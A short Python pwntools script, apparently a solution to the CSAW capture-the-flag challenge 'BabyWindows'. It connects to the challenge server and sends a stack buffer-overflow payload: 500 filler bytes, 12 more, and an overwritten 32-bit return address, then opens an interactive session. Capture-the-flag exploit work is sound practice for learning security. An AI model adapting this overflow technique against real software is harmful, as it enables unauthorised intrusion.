from pwn import *


# p = process("./BabyWindows.exe")
p = remote("win.chal.csaw.io", 7777)


input('?')
pl = b"A"*500
pl += b'B'*12
pl += p32(0x62101661)
p.sendlineafter(b"> ",  pl)



p.interactive()